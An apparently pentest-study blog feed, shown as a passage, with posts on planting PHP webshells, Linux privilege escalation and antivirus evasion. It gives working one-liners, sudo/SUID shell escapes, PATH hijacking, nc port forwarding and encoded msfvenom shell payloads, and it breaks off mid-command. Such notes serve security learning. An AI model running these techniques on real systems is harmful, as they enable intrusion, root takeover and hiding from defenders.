2）再将大马改成jpg图片文件上传，也不会被狗拦 3）访问第一次上传的包含函数的文件，会发现执行了木马 4）这里是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中这是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中</code></pre><h5 id="14、另类拿WebShell"><a href="#14、另类拿WebShell" class="headerlink" title="14、另类拿WebShell"></a>14、另类拿WebShell</h5><ul><li><p>更新页面拿Shell</p><ul><li>在网站模板中的404页面中插入一句话木马，之后找到这个页面的绝对路径，访问之即可拿Shell</li></ul></li><li><p>上传插件拿Shell</p><ul><li>将木马放入zip压缩文件中，最好是网站插件的压缩文件，之后再后台安装插件，选中含有木马的压缩文件，会自动将插件连通木马安装在网站目录下，接下来我们只需要寻找到木马的绝对路径即可</li></ul></li><li><p>上传特殊马拿WebShell</p></li><li><p>还有一种就是我们之前说那种通过上传一些免杀马，变形木马来进行突破封杀</p></li></ul><h4 id="普通权限拿WebShell-常见的方法归纳为7种："><a href="#普通权限拿WebShell-常见的方法归纳为7种：" class="headerlink" title="普通权限拿WebShell 常见的方法归纳为7种："></a>普通权限拿WebShell 常见的方法归纳为7种：</h4><p>普通权限拿WebShell 是啥？</p><pre><code>可以理解为不进后台拿WebShell</code></pre><p>常见方法归纳为六种：</p><h5 id="1、0day-拿WebShell"><a href="#1、0day-拿WebShell" class="headerlink" title="1、0day 拿WebShell"></a>1、0day 拿WebShell</h5><p>​    网上有很多理论知识,自己搜索CMS是discz的相关oday，看看能不能复现</p><h5 id="2、修改网站上传类型配置来拿WebShell"><a href="#2、修改网站上传类型配置来拿WebShell" class="headerlink" title="2、修改网站上传类型配置来拿WebShell"></a>2、修改网站上传类型配置来拿WebShell</h5><p>​    某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p><h5 id="3、xss和sql注入联合利用"><a href="#3、xss和sql注入联合利用" class="headerlink" title="3、xss和sql注入联合利用"></a>3、xss和sql注入联合利用</h5><p>​        有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<?php @eval($_POST['CE']);?>之后再用数据库注入，查询到文件into file成功插入一句话木马</p><h5 id="4、IIS写权限拿WebShell"><a href="#4、IIS写权限拿WebShell" class="headerlink" title="4、IIS写权限拿WebShell"></a>4、IIS写权限拿WebShell</h5><p>​            有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，在这里就不说了，只是提一下。而且已经很少见了，有专门的利用工具（桂林老兵），原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p><pre><code>例如：一开始上传的是test.txt    move 成 test1.asp</code></pre><h5 id="5、远程命令执行拿WebShell"><a href="#5、远程命令执行拿WebShell" class="headerlink" title="5、远程命令执行拿WebShell"></a>5、远程命令执行拿WebShell</h5><p>   执行命令行命令“写入内容到文件<strong>“<code>echo ?php</code>“<code>@eval($_POST[</code>‘cmd’<code>]);?&gt;</code>“<code>&gt; x.php</code></strong> 会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p><h5 id="6、头像上传拿WebShell"><a href="#6、头像上传拿WebShell" class="headerlink" title="6、头像上传拿WebShell"></a><strong>6、头像上传拿WebShell</strong></h5><p>用户注册后有些网站可以上传图片、附件、文件、压缩包等，可以利用上传拿WebShell</p><p>大概思路：</p><ul><li>将大马放在文件夹中</li><li>将文件夹压缩成压缩文件（zip）</li><li>正常上传一个头像并且抓包</li><li>将数据包中图片头像的内容部分删掉</li><li>重新写入文件内容，将压缩文件写入到原本图片的位置</li><li>上传<br>之后返回包中会告诉我们绝对路径</li></ul><h5 id="7、SQL注入漏洞拿WebShell"><a href="#7、SQL注入漏洞拿WebShell" class="headerlink" title="7、SQL注入漏洞拿WebShell"></a>7、SQL注入漏洞拿WebShell</h5><ol><li>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</li><li>对于MsSQL 注入漏洞网站可以通过log 备份、差异备份拿WebShell</li><li>对于MySQL 注入漏洞的网站可以通过into outfile 函数(写入函数)将一句话木马写入，拿WebShell。 还有一个是into file 函数（读取函数）<ul><li>要有file_priv权限</li><li>知道文件绝对路径</li><li>能使用union</li><li>对web目录有读权限<br>注：若过滤了单引号，则可以将函数中的字符进行hex编码</li></ul></li></ol><p>into outfile 函数类似</p><pre><code>4）利用phpmyadmin 将木马导出，拿WebShell5）利用连接拿WebShell</code></pre><h5 id="什么是外连接？"><a href="#什么是外连接？" class="headerlink" title="什么是外连接？"></a>什么是外连接？</h5><p>​        数据库有内连接、外连接来组合条件适用，外连接分为左连接和右连接。这里我们可以使用外连接来获取WebShell.</p><ul><li>内连接：指连接结果仅包含符合连接条件的行，参与连接的两个表都应该符合连接条件。</li><li>外连接：连接结果不仅包含符合连接条件的行同时也包含自身不符合条件的行。包括左外连接、右外连接和全外连接。</li></ul><p>1、内连接</p><p>​    内连接，即最常见的等值连接</p><p>例:</p><pre><code>SELECT * FROM TESTA,TESTBWHERE TESTA.A=TESTB.A</code></pre><p>2、外连接</p><pre><code>外连接分为左外连接，右外连接和全外连接。左外连接 left outer join 或者 left join左外连接就是在等值连接的基础上加上主表中的未匹配数据</code></pre><p>例:</p><pre><code>SELECT *FROM TESTA LEFT OUTER JOIN TESTB ON TESTA.A=TESTB.A </code></pre><p>拓展内容：</p><pre><code>全外连接 full outer join 或者 full join全外连接是在等值连接的基础上将左表和右表的未匹配数据都加上。</code></pre><p>例：</p><pre><code>SELECT * FROM TESTA FULL OUTER JOIN TESTBON TESTA.A=TESTB.A</code></pre><p>结果:外连接内容参考链接：<a href="https://zhidao.baidu.com/question/338244729.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/338244729.html</a></p><p>大概思路：</p><ol><li>创建表</li><li>将一句话写入刚创建的表中</li><li>查询一句话所在表到文件，成功将一句话写入文件</li><li>导出木马到某个路径下</li><li>删除刚刚创建的表（这一步是为了清楚痕迹，在一定程度上可以预防我们被管理员发现）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;拿WebShell-方法&quot;&gt;&lt;a href=&quot;#拿WebShell-方法&quot; class=&quot;headerlink&quot; title=&quot;拿WebShell 方法&quot;&gt;&lt;/a&gt;拿WebShell 方法&lt;/h2&gt;&lt;h3 id=&quot;拿WebShell-的两种类型&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux提权综述</title>
    <link href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/"/>
    <id>https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/</id>
    <published>2020-04-29T06:01:07.000Z</published>
    <updated>2020-06-05T10:09:15.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p><p>，要判断我们应该先对系统相关的信息进行收集。</p><h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>已经拿到低权限shell</li><li>目标系统上有gcc</li><li>有上传文件的权限</li></ul><p><strong>使用命令</strong>：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p><p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p><p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p><p>这里在推荐一个很好用的工具</p><h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p>举个例子：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ perl ./Linux_Exploit_Suggester.pl -k <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Kernel local: <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] semtex</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: www.exploit-db.com/download/<span class="number">25444</span>/‎</span><br><span class="line">[+] memodipper</span><br><span class="line">   CVE<span class="number">-2012</span><span class="number">-0056</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/exploits/18411/</span></span><br><span class="line">[+] perf_swevent</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/download/26131</span></span><br></pre></td></tr></table></figure><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul><li>找到具备利用条件的exp</li><li>上传源代码</li><li>编译exp后执行</li></ul><h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：</span><br><span class="line">漏洞编号：CVE<span class="number">-2016</span><span class="number">-5195</span></span><br><span class="line">漏洞名称：脏牛（Dirty COW）</span><br><span class="line">漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</span><br><span class="line">影响范围：Linux kernel &gt;=<span class="number">2.6</span><span class="number">.22</span> 并且Android也受影响</span><br></pre></td></tr></table></figure><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p><p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p><p>passwd 文件：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p><p>以非root用户打开，提示没有权限。</p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul><li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li><li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li></ul><h4 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h4><p>sudo 是一个linux经常用到的命令，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 <strong>/etc/sudoers</strong>，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p><p><code>sudo -l</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p><p>可以支持所有命令，下面参考这个网址:</p><blockquote><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p></blockquote><p>这里以 awk、man 举例</p><p><strong>1、su</strong></p><blockquote><p>sudo su</p></blockquote><p>输入普通权限用户密码，切换为 root</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p><p><strong>2、awk</strong></p><blockquote><p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p><p><strong>3、man</strong></p><blockquote><p>sudo man man</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p><blockquote></blockquote><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote><p>ls -l /etc/cron*</p></blockquote><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p><p><strong>重写 python</strong></p><p>若这些计划任务的脚本可写，则编辑为 shell</p><p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p><p>测试：</p><blockquote><p>cat /etc/crontab</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p><p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p><blockquote><p>ls -al /tmp/1.py //查看是否有w权限 </p><p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p></blockquote><p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p><p>原本是没有 /tmp/sh</p><p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p><p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p><p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p><p><strong>防范：</strong> </p><p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p><p>​    suid提权：</p><p>​    利用拥有suid的文件执行命令，从而提升权限至root</p><h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>查找系统上运行的所有SUID可执行文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p><h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><p>交互模式可以通过执行Nmap参数” interactive “</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>以下命令将提供一个提升的shell。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">touch</span> <span class="string">pentestlab</span></span><br><span class="line"><span class="attr">find</span> <span class="string">pentestlab -exec whoami \;</span></span><br></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch getflag</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(serv</span><br></pre></td></tr></table></figure><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure><h4 id="环境变量劫持-SUID-扩展"><a href="#环境变量劫持-SUID-扩展" class="headerlink" title="环境变量劫持-SUID 扩展"></a>环境变量劫持-SUID 扩展</h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p><p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p><p><strong>测试：</strong></p><p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p><h4 id="docker-组提权"><a href="#docker-组提权" class="headerlink" title="docker 组提权"></a>docker 组提权</h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p><p>可以参考这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p><h4 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h4><blockquote><p>netstat -antup #查看各种网络服务 </p></blockquote><p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p><p><strong>1、redis 反弹 shell</strong></p><p>nc 单向转发</p><blockquote><p>nc -l 12345 | nc 192.168.191.170 80</p></blockquote><p>双向转发</p><blockquote><p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p></blockquote><p>双向转发本人测试失败，希望大佬们提供解决的办法</p><p>socat</p><p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p><blockquote><p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p></blockquote><p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p><blockquote><p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p></blockquote><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p><p><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux提权方法综述&quot;&gt;&lt;a href=&quot;#linux提权方法综述&quot; class=&quot;headerlink&quot; title=&quot;linux提权方法综述&quot;&gt;&lt;/a&gt;linux提权方法综述&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="linux提权" scheme="https://shu1l.github.io/tags/linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之免杀入门</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</id>
    <published>2020-04-28T13:18:46.000Z</published>
    <updated>2020-06-05T10:26:17.143Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装<ul><li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li></ul></li></ul><h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul><li>恶意程序最主要的防护手段<ul><li>杀毒软件/防病毒软件</li><li>客户端/服务器/邮件防病毒</li></ul></li><li>检测原理<ul><li>基于二进制文件中特征签名的黑名单检测方法</li><li>基于行为的分析方法（启发式）</li></ul></li><li>事后手段<ul><li>永远落后于病毒发展</li></ul></li></ul><h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密是的特征字符不可读，从而逃避AV 检测</li><li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器 cripter 的特征字符</li></ul></li></ul><h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul><li>恶意软件制造者<ul><li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li><li>使用独有 crypter 软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable 还最高追求 （FUD）</li></ul></li><li>AV 厂商<ul><li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li><li>一般新的恶意软件安全 UD 窗口期是一周左右</li><li>乐毅软件制造者永无休止的拉锯战</li><li>信的启发式检测技术尚有待完善(误杀漏杀)</li></ul></li><li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul><li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul><li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li></ul></li><li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li><li>在线多引擎查杀网站与 AV 查杀共享信息</li><li>搞黑的在线多引擎查毒站<ul><li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li>常用的 RAT 软件<ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul></li></ul><h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul><li>生成反弹 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure><ul><li>加密编码反弹 shell</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o 